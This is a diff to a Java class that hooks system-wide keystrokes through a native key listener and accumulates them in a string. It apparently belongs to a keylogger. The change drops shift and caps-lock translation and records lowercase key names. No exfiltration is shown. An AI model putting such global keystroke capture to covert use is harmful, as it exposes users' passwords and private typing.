@@ -69,8 +69,7 @@ public class KeyStroke extends JFrame implements NativeKeyListener, Runnable{
         }
         b_hook=false;
         b_unhook=false;
-        b_shift=false;
-        b_capslock=false;
+      
     }
     public boolean getHook()
     {
@@ -113,99 +112,16 @@ public class KeyStroke extends JFrame implements NativeKeyListener, Runnable{
     public void nativeKeyPressed(NativeKeyEvent e) {}
    
     public void nativeKeyReleased(NativeKeyEvent e) {
-        //System.out.println("in native key released");
+      
         if (b_hook == true && b_unhook == false) {
-            //System.out.println(" Released: " + NativeKeyEvent.getKeyText(e.getKeyCode()));
+           
             String pressed = NativeKeyEvent.getKeyText(e.getKeyCode());
-            if (pressed.equals("⇧" +
-                    ""))
-                b_shift = true;
-            else if (pressed.equals("⇪"))
-                b_capslock = !b_capslock;
-            else if (pressed.equals("Open Bracket"))
-                s += "[";
-            else if (pressed.equals("Close Bracket"))
-                s += "]";
-            else if (pressed.equals("Backspace")) {
+            s += pressed.toLowerCase();
+            if(pressed.equals("Enter"))
+            {
+                s+= "\n";
             }
-            else if (pressed.equals("␣"))
-                 s+=" ";
-            else if (pressed.equals("⇥"))
-                s += "\t";
-            else if (pressed.equals("⏎"))
-                s += "\n";
-            else if (b_shift||b_capslock) {
-                if (pressed.matches("[A-Z]"))
-                    s += pressed.toUpperCase();
-                else if (pressed.equals("1"))
-                    s += "!";
-                else if (pressed.equals("2"))
-                    s += "@";
-                else if (pressed.equals("3"))
-                    s += "#";
-                else if (pressed.equals("4"))
-                    s += "$";
-                else if (pressed.equals("5"))
-                    s += "%";
-                else if (pressed.equals("6"))
-                    s += "^";
-                else if (pressed.equals("7"))
-                    s += "&";
-                else if (pressed.equals("8"))
-                    s += "*";
-                else if (pressed.equals("9"))
-                    s += "(";
-                else if (pressed.equals("0"))
-                    s += ")";
-                else if (pressed.equals("Minus"))
-                    s += "_";
-                else if (pressed.equals("Equals"))
-                    s += "+";
-                else if (pressed.equals("Open Bracket"))
-                    s += "{";
-                else if (pressed.equals("Close Bracket"))
-                    s += "}";
-                else if (pressed.equals("Back Slash"))
-                    s += "|";
-                else if (pressed.equals("Semicolon"))
-                    s += ":";
-                else if (pressed.equals("Quote"))
-                    s += "\\";
-                else if (pressed.equals("Comma"))
-                    s += "<";
-                else if (pressed.equals("Period"))
-                    s += ">";
-                else if (pressed.equals("Dead Acute"))
-                    s += "?";
-                else if (pressed.equals("Back Quote"))
-                    s += "~";
-            } else {
-                if (pressed.matches("[A-Z]"))
-                    s += pressed.toLowerCase();
-                else if (pressed.equals("Minus"))
-                    s += "-";
-                else if (pressed.equals("Equals"))
-                    s += "=";
-                else if (pressed.equals("Open Bracket"))
-                    s += "[";
-                else if (pressed.equals("Close Bracket"))
-                    s += "]";
-                else if (pressed.equals("Back Slash"))
-                    s += "\\";
-                else if (pressed.equals("Semicolon"))
-                    s += ";";
-                else if (pressed.equals("Quote"))
-                    s += "'";
-                else if (pressed.equals("Comma"))
-                    s += ",";
-                else if (pressed.equals("Period"))
-                    s += ".";
-                else if (pressed.equals("Dead Acute"))
-                    s += "/";
-                else if (pressed.equals("Back Quote"))
-                    s += "`";
-            }
-            b_shift=false;
+            
         }
     }
 
